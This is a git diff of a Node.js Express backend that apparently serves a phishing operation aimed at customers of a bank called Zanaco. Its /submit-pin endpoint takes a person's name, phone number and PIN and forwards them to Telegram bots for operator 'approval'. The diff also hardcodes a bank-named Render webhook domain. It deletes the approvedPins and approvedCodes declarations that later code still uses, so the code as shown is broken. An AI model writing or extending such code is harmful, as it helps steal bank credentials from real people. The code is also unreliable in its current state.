@@ -6,10 +6,6 @@ const { v4: uuidv4 } = require('uuid');
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-// Store approval states per requestId
-const approvedPins = {};
-const approvedCodes = {};
-
 // ---------------- MULTI-BOT SETUP ----------------
 // List of bots. Your current bot is bot1.
 const bots = [
@@ -66,7 +62,7 @@ app.post('/submit-pin', (req, res) => {
     console.log('📩 PIN received:', { name, phone, pin, requestId });
     approvedPins[requestId] = null;
 
-    const bot = bots[0]; // Use first bot for now (keeps existing behavior)
+    const bot = bots[0]; // Use first bot for now
 
     sendTelegramMessage(
         bot,
@@ -152,8 +148,8 @@ app.post('/add-bot', async (req, res) => {
     const newBot = { botId, botToken, chatId, botName };
     bots.push(newBot);
 
-    // Set webhook for this bot automatically
-    const webhookUrl = `https://YOUR_DOMAIN/telegram-webhook/${botId}`;
+    // ---------------- FIXED WEBHOOK ----------------
+    const webhookUrl = `https://zanaco-backend.onrender.com/telegram-webhook/${botId}`; // <- replace with your actual Render domain
     try {
         const response = await axios.get(
             `https://api.telegram.org/bot${botToken}/setWebhook?url=${webhookUrl}`
